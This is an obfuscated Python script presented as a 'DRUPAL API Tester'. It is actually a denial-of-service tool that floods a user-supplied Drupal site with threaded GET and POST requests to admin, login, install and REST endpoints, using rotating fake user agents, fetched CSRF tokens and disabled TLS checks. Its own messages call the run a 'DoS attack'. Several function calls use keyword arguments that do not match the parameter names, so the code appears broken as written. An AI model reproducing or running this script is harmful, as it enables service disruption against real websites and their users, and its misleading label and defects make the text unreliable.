lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl, llllllllllllIII, lllllllllllIlll = Exception, print, input, range, KeyboardInterrupt, bool, __name__, ValueError, int

from requests.packages.urllib3 import disable_warnings as lllIlIlIlIIIlI
from random import choice as lllIllllllIllI, uniform as lllIIlIlllllII
from requests import post as IIlllIIlllllIl, get as IIllIIIlllIIIl
from time import sleep as IlIIIIIlIlllII, time as IllllIIlIlIlII
from concurrent.futures import ThreadPoolExecutor as llIIIlIIIIIlII
from requests.exceptions import RequestException as lllIIlIIIlIIII
from urllib3.exceptions import InsecureRequestWarning as llIIIllIlllIII
lllIlIlIlIIIlI(llIIIllIlllIII)

class lIlIlIIlIllIlIIlII:

    def __init__(lIlIllIlllIlIIIIIl):
        lIlIllIlllIlIIIIIl.IIlIIIlIlllllIIllI = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36']
        lIlIllIlllIlIIIIIl.IIllIIllIIIllllIII = {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest', 'X-CSRF-Token': 'null'}
        lIlIllIlllIlIIIIIl.lllIIIIlIIIlIlIlIl = ['user/login', 'node', 'admin/content', 'admin/people', 'admin/modules', 'admin/config', 'system/ajax', 'core/install.php', 'user/register', 'user/password', 'admin/structure', 'admin/reports', 'batch', 'entity/node', 'rest/session/token']
        lIlIllIlllIlIIIIIl.IlIlIlIllIlIlIllII = {'auth_test': {'name': 'admin', 'pass': 'admin123', 'form_id': 'user_login_form'}, 'content_test': {'title': [{'value': 'Test Content'}], 'type': [{'target_id': 'article'}], 'body': [{'value': 'Test body content'}], '_links': {'type': {'href': 'node/article'}}}}

    def IIIlIlllIlIlIlllIl(lIlIllIlllIlIIIIIl):
        return lllIllllllIllI(lIlIllIlllIlIIIIIl.IIlIIIlIlllllIIllI)

    def lIIlIlllIIlIIlllII(lIlIllIlllIlIIIIIl, IIllIlIlllllIlIlIl):
        try:
            IllllIlIllIllIIlIl = IIllIIIlllIIIl(f"{IIllIlIlllllIlIlIl.rstrip('/')}/rest/session/token", headers=lIlIllIlllIlIIIIIl.IIllIIllIIIllllIII, verify=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), timeout=5)
            if IllllIlIllIllIIlIl.ok:
                return IllllIlIllIllIIlIl.text
        except:
            pass
        return None

    def IlllIllllIlIIIIIII(lIlIllIlllIlIIIIIl, lIIIIIIIlllIIllIlI, IIllIlIlllllIlIlIl, lllllIIIlllIlIIIII, IIlllllllIIIIIIlIl=None):
        llIIllIllIIIIllIII = f"{IIllIlIlllllIlIlIl.rstrip('/')}/{lllllIIIlllIlIIIII.lstrip('/')}"
        lIlIllIlllIlIIIIIl.IIllIIllIIIllllIII['User-Agent'] = lIlIllIlllIlIIIIIl.IIIlIlllIlIlIlllIl()
        if lIIIIIIIlllIIllIlI.upper() == 'POST':
            lIIllllIIIlIIIlIlI = lIlIllIlllIlIIIIIl.lIIlIlllIIlIIlllII(IIllIlIlllllIlIlIl)
            if lIIllllIIIlIIIlIlI:
                lIlIllIlllIlIIIIIl.IIllIIllIIIllllIII['X-CSRF-Token'] = lIIllllIIIlIIIlIlI
        try:
            if lIIIIIIIlllIIllIlI.upper() == 'GET':
                IllllIlIllIllIIlIl = IIllIIIlllIIIl(llIIllIllIIIIllIII, headers=lIlIllIlllIlIIIIIl.IIllIIllIIIllllIII, timeout=5, verify=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0))
            else:
                IllllIlIllIllIIlIl = IIlllIIlllllIl(llIIllIllIIIIllIII, json=IIlllllllIIIIIIlIl, headers=lIlIllIlllIlIIIIIl.IIllIIllIIIllllIII, timeout=5, verify=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0))
            llllllllllllllI(f'[{IllllIlIllIllIIlIl.status_code}] {lIIIIIIIlllIIllIlI} {llIIllIllIIIIllIII}')
            return IllllIlIllIllIIlIl.text if IllllIlIllIllIIlIl.ok else None
        except lllIIlIIIlIIII as llIIIllllIlIlIIIlI:
            llllllllllllllI(f'[ERROR] {lIIIIIIIlllIIllIlI} {llIIllIllIIIIllIII}: {llIIIllllIlIlIIIlI}')
            return None

    def IIIlllIlIllIIlllII(lIlIllIlllIlIIIIIl, IIllIlIlllllIlIlIl, IIIIlIlIIllIIIlllI=10, lIIIllIllIIIIIllIl=60):
        llllllllllllllI(f'[INFO] Starting DoS attack on {IIllIlIlllllIlIlIl} for {lIIIllIllIIIIIllIl}s with {IIIIlIlIIllIIIlllI} threads')
        IllIllIIIlllIIlIII = IllllIIlIlIlII()

        def lIllllIIlIIllllIII():
            while IllllIIlIlIlII() - IllIllIIIlllIIlIII < lIIIllIllIIIIIllIl:
                lllllIIIlllIlIIIII = lllIllllllIllI(lIlIllIlllIlIIIIIl.lllIIIIlIIIlIlIlIl)
                lIIIIIIIlllIIllIlI = lllIllllllIllI(['GET', 'POST'])
                lllIllllIlIllIllII = lIlIllIlllIlIIIIIl.IlIlIlIllIlIlIllII['content_test'] if lIIIIIIIlllIIllIlI == 'POST' else None
                lIlIllIlllIlIIIIIl.IlllIllllIlIIIIIII(lIIIIIIIlllIIllIlI, IIllIlIlllllIlIlIl, lllllIIIlllIlIIIII, data=lllIllllIlIllIllII)
                IlIIIIIlIlllII(lllIIlIlllllII(0.1, 0.3))
        with llIIIlIIIIIlII(max_workers=IIIIlIlIIllIIIlllI) as lIlllIllIlIIllIIIl:
            llIIIIlIlllllIllIl = [lIlllIllIlIIllIIIl.submit(lIllllIIlIIllllIII) for llIlIllIIllIlIllll in lllllllllllllII(IIIIlIlIIllIIIlllI)]
            for lIIllIIlIIIIlIIlII in llIIIIlIlllllIllIl:
                lIIllIIlIIIIlIIlII.result()

def IlIIIlIIIlIIIIIIll():
    llllllllllllllI('\n    ╔════════════════════════════════════════╗\n    ║          DRUPAL API Tester             ║\n    ║            coded by Danz               ║\n    ╚════════════════════════════════════════╝\n    ')
    llIIIllIlllIlIIIlI = lllllllllllllIl('Masukan target Drupal URL (e.g., https://example.com): ').strip()
    if not (llIIIllIlllIlIIIlI.startswith('http://') or llIIIllIlllIlIIIlI.startswith('https://')):
        llllllllllllllI('[ERROR] Invalid URL. Please include http:// or https://')
        return
    try:
        IIIIlIlIIllIIIlllI = lllllllllllIlll(lllllllllllllIl('Masukan number of threads (default: 20): ') or 20)
        lIIIllIllIIIIIllIl = lllllllllllIlll(lllllllllllllIl('Masukan duration in seconds (default: 120): ') or 120)
        lIlllIlIlllIlIIlII = lIlIlIIlIllIlIIlII()
        lIlllIlIlllIlIIlII.IIIlllIlIllIIlllII(llIIIllIlllIlIIIlI, workers=IIIIlIlIIllIIIlllI, duration=lIIIllIllIIIIIllIl)
    except llllllllllllIll:
        llllllllllllllI('\n[INFO] Attack interrupted by user.')
    except llllllllllllIII:
        llllllllllllllI('[ERROR] Please enter valid numbers for threads and duration.')
    except lllllllllllllll as llIIIllllIlIlIIIlI:
        llllllllllllllI(f'[ERROR] Unexpected error occurred: {llIIIllllIlIlIIIlI}')
if llllllllllllIIl == '__main__':
    IlIIIlIIIlIIIIIIll()
